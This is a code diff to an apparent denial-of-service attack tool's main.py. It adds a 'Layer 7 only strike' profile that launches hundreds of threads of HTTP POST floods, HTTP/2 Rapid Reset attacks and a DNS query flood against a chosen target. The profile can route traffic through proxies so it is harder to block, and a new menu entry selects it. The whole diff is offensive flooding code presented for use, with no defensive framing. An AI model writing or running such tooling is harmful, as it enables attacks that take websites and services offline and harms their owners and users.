@@ -140,6 +140,66 @@ def level2_penetrator_strike(target, use_proxy, network_interface):
         stop_event.set()
 
 
+# In main.py
+
+# ... (keep all your existing imports and helper functions)
+# ... (keep all the other attack profile functions)
+
+# --- NEW: LAYER 7 ONLY ATTACK PROFILE ---
+def layer7_only_strike(target, use_proxy, network_interface):
+    """
+    Launches a focused and intense assault using ONLY Layer 7 vectors.
+    This profile is designed to bypass network-layer firewalls and directly
+    target the CPU and application logic of the web server.
+    """
+    print("\n" + "=" * 60)
+    print("MODE: LAYER 7 ONLY STRIKE (APPLICATION ASSAULT)")
+    print("=" * 60)
+
+    stop_event, pause_event = threading.Event(), threading.Event()
+    attack_threads = []
+
+    # --- Use intense parameters for a high-impact burst ---
+    params = {
+        "post_threads": 250,  # High thread count for the POST flood
+        "h2_threads": 75,  # High thread count for H2
+        "duration": 120,  # A 2-minute test duration
+    }
+    print(f"[CONFIG] Using {params['post_threads']} HTTP POST threads and {params['h2_threads']} H2 connections.")
+
+    # --- Launch the L7 Attack Vectors ---
+    if use_proxy:
+        print("[PROXY] L7 attacks will be routed through the proxy. This will be slower but harder to block.")
+
+    # Vector 1: The Heavy POST Flood to exhaust application and database logic.
+    print("[+] Launching HTTP POST Flood...")
+    for port in [80, 443]:  # Target standard web ports
+        args = (target, port, params["duration"], stop_event, pause_event, params["post_threads"], use_proxy)
+        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_http_post, args))
+
+    # Vector 2: The H2 Rapid Reset to exhaust the web server's core processing engine.
+    print("[+] Launching HTTP/2 Rapid Reset...")
+    for port in [443, 8443]:  # Target common H2 ports
+        args = (target, port, params["duration"], stop_event, pause_event, params["h2_threads"])
+        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_h2_rapid_reset, args))
+
+    # Vector 3 (Optional but Recommended): The DNS Query Flood
+    # While it's a L7 attack on the DNS *service*, it's still a good complement.
+    print("[+] Launching DNS Query Flood...")
+    args = (target, params["duration"], stop_event, pause_event, params["post_threads"], network_interface)
+    attack_threads.append(launch_attack_thread(counter_strike_helper.attack_dns_query_flood, args))
+
+    print(f"\n[+] Layer 7 Only attack launched. Running for {params['duration']} seconds. Press Ctrl+C to stop.")
+    try:
+        time.sleep(params["duration"])
+    except KeyboardInterrupt:
+        print("\n[!] Keyboard interrupt received.")
+    finally:
+        print("\n[!] Timespan elapsed or interrupted. Signaling all threads to stop...")
+        stop_event.set()
+        time.sleep(2)  # Give threads a moment to shut down
+
+
 # --- NEW: RECON-LED ATTACK ORCHESTRATOR ---
 def reconnaissance_led_strike(target, use_proxy, network_interface):
     """
@@ -516,7 +576,7 @@ if __name__ == "__main__":
         Select an Action:
           1: Launch Blended Attack Profile
           2: Run Reconnaissance / Discovery
-          3: Launch Targeted Heavy POST Flood
+          3: Launch Targeted Attack
 
         Please enter your option: """
         main_choice = int(input(main_menu_text))
@@ -547,7 +607,20 @@ if __name__ == "__main__":
         elif main_choice == 2:
             run_deep_reconnaissance(target_domain)
         elif main_choice == 3:
-            run_heavy_post_strike(target_domain, proxy_enabled)
+            targeted_menu_text = """
+            Select a Targeted Attack:
+              1: Heavy HTTP POST Flood (User-configured)
+              2: Layer 7 Only Strike (Pre-configured assault)
+
+            Please enter your option: """
+            targeted_choice = int(input(targeted_menu_text))
+
+            if targeted_choice == 1:
+                run_heavy_post_strike(target_domain, proxy_enabled)
+            elif targeted_choice == 2:
+                layer7_only_strike(target_domain, proxy_enabled, NETWORK_INTERFACE)
+            else:
+                print("Invalid targeted attack option.")
         else:
             print("Invalid category selected. Exiting.")
 
